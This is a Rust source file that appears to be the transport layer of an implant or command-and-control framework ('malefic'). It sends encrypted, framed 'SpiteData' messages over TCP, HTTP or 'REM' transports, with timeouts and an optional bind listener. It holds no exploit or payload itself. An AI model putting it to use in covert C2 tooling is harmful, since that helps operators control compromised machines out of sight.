#[cfg(feature = "tcp")]
pub mod tcp;
#[cfg(feature = "transport_http")]
pub mod http;
#[cfg(feature = "transport_rem")]
pub mod rem;

#[cfg(feature = "proxy")]
pub mod proxie;

use anyhow::Result;
use async_trait::async_trait;
use futures::lock::Mutex;
use futures::{join, AsyncRead, AsyncReadExt, AsyncWrite, AsyncWriteExt, FutureExt};
use futures_timer::Delay;
use malefic_helper::debug;
use malefic_proto::crypto::{Cryptor, CryptorError};
use malefic_proto::{parser_header, SpiteData, HEADER_LEN};
use std::io;
use std::pin::Pin;
use std::sync::Arc;
use std::time::Duration;
use thiserror::Error;

cfg_if::cfg_if! {
    if #[cfg(feature = "transport_tcp")] {
        pub use tcp::TCPTransport as InnterTransport;
        pub use tcp::TCPClient as Client;
    } else if #[cfg(feature = "transport_http")] {
        pub use http::HTTPTransport as InnterTransport;
        pub use http::HTTPClient as Client;
    } else if #[cfg(feature = "transport_rem")] {
        pub use rem::REMTransport as InnterTransport;
        pub use rem::REMClient as Client;
    } else {
        compile_error!("No transport selected");
    }
}

#[async_trait]
pub trait TransportImpl: AsyncRead + AsyncWrite + Unpin + Send  {}

impl<T> TransportImpl for T where T: AsyncRead + AsyncWrite + Unpin + Send  {}


#[async_trait]
pub trait ListenerExt: Sized {
    async fn bind(addr: &str) -> anyhow::Result<Self>;
    async fn accept(&mut self) -> anyhow::Result<impl TransportImpl>;
}

#[async_trait]
pub trait DialerExt {
    async fn connect(&mut self, addr: &str) -> anyhow::Result<impl TransportImpl>;
}



#[cfg(feature = "bind")]
cfg_if::cfg_if! {
    if #[cfg(feature = "transport_tcp")] {
        pub use tcp::TCPListenerExt as Listener;
    } else {
        compile_error!("No transport selected");
    }
}

#[derive(Error, Debug)]
pub enum TransportError {
    #[error(transparent)]
    AnyHowError(#[from] anyhow::Error),

    #[error("Failed to connect to the server")]
    ConnectionError,

    #[error("Failed to encrypt/decrypt data")]
    CryptorError(#[from] CryptorError),

    #[error("Failed to send data")]
    SendError,

    #[error("Failed to send data within the timeout")]
    SendTimeout,

    #[error("Deadline")]
    Deadline,

    #[error("Failed to receive data")]
    RecvError,

    #[error("I/O Error: {0}")]
    IoError(#[from] io::Error), // 转换标准库的 I/O 错误

    #[error("Parser error: {0}")]
    ParserError(#[from] malefic_proto::ParserError),

    #[error("Unexpected end of stream")]
    UnexpectedEof,

    #[error("Unknown error occurred")]
    UnknownError,
}

pub struct Transport {
    pub inner: InnterTransport,
    pub write_lock: Arc<Mutex<bool>>,
    pub read_lock: Arc<Mutex<bool>>,
}

// 传输层读取半部
pub struct TransportReadHalf {
    reader: Pin<Box<dyn AsyncRead + Send + Sync>>,
    read_lock: Arc<Mutex<bool>>,
}

// 传输层写入半部
pub struct TransportWriteHalf {
    writer: Pin<Box<dyn AsyncWrite + Send + Sync>>,
    write_lock: Arc<Mutex<bool>>,
}

impl Transport {
    pub fn new(transport: InnterTransport) -> Self {
        Transport {
            inner: transport,
            write_lock: Arc::new(Mutex::new(false)),
            read_lock: Arc::new(Mutex::new(false)),
        }
    }

    pub fn split(self) -> (TransportReadHalf, TransportWriteHalf) {
        let (reader, writer) = self.inner.split();
        let read_half = TransportReadHalf {
            reader: Box::pin(reader),
            read_lock: self.read_lock.clone(),
        };
        let write_half = TransportWriteHalf {
            writer: Box::pin(writer),
            write_lock: self.write_lock,
        };
        (read_half, write_half)
    }

    pub async fn write_wait(&self) -> Result<(), ()> {
        loop {
            let lock_guard = self.write_lock.lock().await;
            if *lock_guard {
                return Ok(());
            }
            drop(lock_guard);
            Delay::new(Duration::from_millis(10)).await;
        }
    }

    pub async fn write_over(&self) {
        let mut lock = self.write_lock.lock().await;
        *lock = true;
    }

    pub async fn read_wait(&self) -> Result<(), ()> {
        loop {
            let lock_guard = self.read_lock.lock().await;
            if *lock_guard {
                return Ok(());
            }
            drop(lock_guard);
            Delay::new(Duration::from_millis(10)).await;
        }
    }

    pub async fn read_over(&self) {
        let mut lock = self.read_lock.lock().await;
        *lock = true;
    }
}

impl TransportReadHalf {
    async fn read_over(&self) {
        let mut lock = self.read_lock.lock().await;
        *lock = true;
    }

    pub async fn read(&mut self, len: usize) -> Result<Vec<u8>> {
        let mut result = vec![0u8; len];
        let mut total_read = 0;

        while total_read < len {
            let remaining = len - total_read;
            let chunk_size = remaining.min(8192);

            let n = self.reader.read(&mut result[total_read..total_read + chunk_size]).await?;
            if n == 0 {
                // 连接关闭或没有更多数据
                break;
            }
            total_read += n;
        }

        result.truncate(total_read);
        Ok(result)
    }
}

impl TransportWriteHalf {
    async fn write_wait(&self) -> Result<(), ()> {
        loop {
            let lock_guard = self.write_lock.lock().await;
            if *lock_guard {
                return Ok(());
            }
            drop(lock_guard);
            Delay::new(Duration::from_millis(10)).await;
        }
    }

    async fn write_over(&self) {
        let mut lock = self.write_lock.lock().await;
        *lock = true;
    }

    pub async fn write(&mut self, data: &[u8]) -> Result<usize> {
        self.writer.write_all(data).await?;
        Ok(data.len())
    }

    pub async fn flush(&mut self) -> Result<()> {
        self.writer.flush().await?;
        Ok(())
    }
}



#[derive(Clone)]
pub struct Stream {
    pub cryptor: Cryptor,
}

impl Stream {
    pub async fn write(&mut self, writer: &mut TransportWriteHalf, data: &[u8]) -> Result<usize> {
        let encrypted_data = self.cryptor.encrypt(data.to_vec())?;
        writer.write(&encrypted_data).await
    }

    pub async fn read(&mut self, reader: &mut TransportReadHalf, len: usize) -> Result<Vec<u8>> {
        let data = reader.read(len).await?;
        debug!("[stream] read expect:{} actual:{}", len, data.len());
        if data.len() != len {
            return Err(TransportError::RecvError.into());
        }
        Ok(self.cryptor.decrypt(data)?)
    }

    pub fn reset(&mut self) {
        self.cryptor.reset();
    }
}



impl Client {

    pub async fn handler(
        &mut self,
        transport: InnterTransport,
        data: SpiteData,
    ) -> Result<Option<SpiteData>> {
        self.stream.cryptor.reset();

        let mut sender = self.clone();
        let mut receiver = self.clone();

        let (mut reader, mut writer) = Transport::new(transport).split();
        
        futures::select! {
            result = async {
                let send_task = sender.send(&mut writer, data).fuse();
                let recv_task = receiver.recv(&mut reader).fuse();
                let (recv_result, send_result) = join!(recv_task, send_task);

                // 关闭连接
                let _ = writer.writer.close().await;

                if let Err(e) = send_result {
                    debug!("[client] send error: {:?}", e);
                    return Err(e.into());
                }

                match recv_result {
                    Ok(data) => Ok(Some(data)),
                    Err(e) => {
                        debug!("[client] recv error: {:?}", e);
                        Ok(None)
                    }
                }
            }.fuse() => result,
            _ = Delay::new(Duration::from_secs(10)).fuse() => {
                debug!("[client] handler timeout after 10 seconds");
                // 尝试关闭连接
                let _ = writer.writer.close().await;
                Err(TransportError::Deadline.into())
            }
        }
    }

    pub async fn send(&mut self, writer: &mut TransportWriteHalf, data: SpiteData) -> Result<()> {
        futures::select! {
            result = async {
                let header = data.header();
                let n = self.stream.write(writer, &header).await?;
                if n != header.len() {
                    return Err(TransportError::SendError.into());
                }
                debug!("[transport] send header success");

                let body = data.body();
                let n = self.stream.write(writer, &body).await?;
                if n != body.len() {
                    return Err(TransportError::SendError.into());
                }
                debug!("[transport] send body success");
                writer.flush().await?;
                writer.write_over().await;
                debug!("[transport] send over");
                writer.write_wait().await.ok();
                Ok(())
            }.fuse() => result,
            _ = Delay::new(Duration::from_secs(2)).fuse() => {
                Err(TransportError::SendTimeout.into())
            }
        }
    }

    pub async fn recv(&mut self, reader: &mut TransportReadHalf) -> Result<SpiteData> {
        futures::select! {
            res = async {
                // 接收header
                let response_data = self.stream.read(reader, HEADER_LEN).await?;
                if response_data.len() != HEADER_LEN {
                    return Err(TransportError::RecvError.into());
                }

                let mut spitedata = parser_header(&response_data)?;
                debug!("[client] recv header success: {:?}, length: {}", response_data, spitedata.length);

                // 接收body
                let data = self.stream.read(reader, spitedata.length as usize + 1).await?;
                spitedata.set_data(data)?;
                reader.read_over().await;
                debug!("[client] recv over");
                Ok(spitedata)
            }.fuse() => {
                match res {
                    Ok(data) => Ok(data),
                    Err(e) => {
                        reader.read_over().await;
                        Err(e)
                    }
                }
            },
            _ = Delay::new(Duration::from_secs(2)).fuse() => {
                reader.read_over().await;
                Err(TransportError::RecvError.into())
            }
        }
    }
}
